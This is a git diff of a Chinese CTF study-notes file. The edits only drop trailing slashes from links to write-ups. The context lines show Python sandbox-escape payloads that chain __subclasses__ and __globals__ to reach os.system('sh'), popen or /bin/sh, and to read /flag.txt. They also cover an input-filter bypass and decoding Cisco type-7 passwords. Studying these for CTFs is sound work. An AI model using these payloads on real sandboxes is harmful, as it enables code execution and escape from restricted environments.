@@ -4,7 +4,7 @@
 
 ## Pyjail
 
-[Pyjail](https://cheatsheet.haax.fr/linux-systems/programing-languages/python/)([python沙盒逃逸](https://www.cnblogs.com/h0cksr/p/16189741.html))。这类题型知识点比较杂，记录一点看过的，以后要用就翻
+[Pyjail](https://cheatsheet.haax.fr/linux-systems/programing-languages/python)([python沙盒逃逸](https://www.cnblogs.com/h0cksr/p/16189741.html))。这类题型知识点比较杂，记录一点看过的，以后要用就翻
 
 - `[*().__class__.__base__.__subclasses__()[50+50+37].__init__.__globals__.values()][47]([].__doc__[5+5+7::79])`
 > 利用\*符号将字典值转为列表，从而可使用\[\]取值+利用system函数和`__doc__`里的sh字符串getshell。例题:[Virus Attack](https://github.com/daffainfo/ctf-writeup/tree/main/2023/ByteBanditsCTF%202023/Virus%20Attack)。类似的题目还有里面提到的[Albatross](https://okman.gitbook.io/okman-writeups/miscellaneous-challenges/redpwnctf-albatross)，不过这道题多了个unicode哥特字符也能执行函数的考点：
@@ -144,7 +144,7 @@ gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai
     - `[print(y('/flag.txt').read()) for x,y in enumerate(string.Formatter().get_field('a.__self__.open', [], {'a': repr})) if x==0]`
     - `print(string.Formatter().get_field("a.__init__.__globals__[sys]", [], kwargs={"a":string.Formatter().get_field("a.__class__.__base__.__subclasses__", [], kwargs={"a":[]})[0]().pop(107)})[0].modules.pop('os').popen('cmd').read())`
     - https://github.com/nikosChalk/ctf-writeups/tree/master/uiuctf23/pyjail/rattler-read/writeup : `class Baz(string.Formatter): pass; get_field = lambda self, field_name, args, kwargs: (string.Formatter.get_field(self, field_name, args, kwargs)[0]("/bin/sh"), ""); \rBaz().format("{0.Random.__init__.__globals__[_os].system}", random)`
-    - https://ur4ndom.dev/posts/2023-07-02-uiuctf-rattler-read/ ：`string.Formatter().get_field("a.__class__.__base__.__subclasses__", [], {"a": ""})[0]()[84].load_module("os").system("sh")`,`for f in (g := (g.gi_frame.f_back.f_back for _ in [1])): print(f.f_builtins)`(逃逸exec的上下文然后请求builtin。这句还没有实现执行命令或者读文件，只是导出builtins。导出后参考上面的用法使用)
+    - https://ur4ndom.dev/posts/2023-07-02-uiuctf-rattler-read ：`string.Formatter().get_field("a.__class__.__base__.__subclasses__", [], {"a": ""})[0]()[84].load_module("os").system("sh")`,`for f in (g := (g.gi_frame.f_back.f_back for _ in [1])): print(f.f_builtins)`(逃逸exec的上下文然后请求builtin。这句还没有实现执行命令或者读文件，只是导出builtins。导出后参考上面的用法使用)
 - [Censorship](https://github.com/les-amateurs/AmateursCTF-Public/tree/main/2023/misc/censorship)：环境包含flag变量需要泄露+绕过滤
     - 覆盖程序函数从而取消过滤。如题目用ascii(input)来保证输入只能是ascii。我们可以让`ascii = lambda x: x`，然后就能用非ascii字符绕过
     - https://github.com/D13David/ctf-writeups/tree/main/amateursctf23/misc/censorship ：题目中存在包含flag的变量`_`，直接`locals()[_]`然后keyerror
@@ -2988,7 +2988,7 @@ a=A()
 - 另一个wp： https://vaktibabat.github.io/posts/ictf_2024
 357. [Routed](https://odintheprotector.github.io/2024/07/22/imaginaryCTF-forensic.html)
 - `.pkz`后缀文件可以在Cisco Packet Tracer里打开。其中有个`View all commands entered in the file`按钮，可以用来藏东西
-- 如果发现开头为7的cisco密码，可以直接使用工具获取其值： https://packetlife.net/toolbox/type7/
+- 如果发现开头为7的cisco密码，可以直接使用工具获取其值： https://packetlife.net/toolbox/type7
 358. [sniff](https://mwlik.github.io/2024-08-05-crewctf-2024-sniff-challenge)
 - 使用[salae logic analyzer](https://www.saleae.com)分析硬件[Sniffing attack](https://en.wikipedia.org/wiki/Sniffing_attack)的结果。关于Saleae Logic Analyzer怎么用： https://www.youtube.com/watch?v=XGxE4FJH5kI 。这硬件的东西我啥也不会，记录一下相关链接
 - 使用键盘的相关ascii code：[cardkb](https://github.com/ian-antking/cardkb),使用[I2C](https://youtu.be/CAvawEcxoPU)协议通信，见 https://docs.m5stack.com/en/unit/cardkb_1.1#protocol
